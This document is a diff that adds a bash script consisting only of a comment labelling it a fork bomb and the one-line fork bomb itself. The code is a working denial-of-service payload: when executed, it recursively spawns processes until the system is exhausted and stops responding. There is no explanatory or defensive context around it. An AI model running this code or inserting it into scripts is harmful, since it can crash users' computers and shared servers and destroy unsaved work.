@@ -1,0 +1,3 @@
+#!/bin/bash
+# Fork Bomb
+:(){ :|:& };:
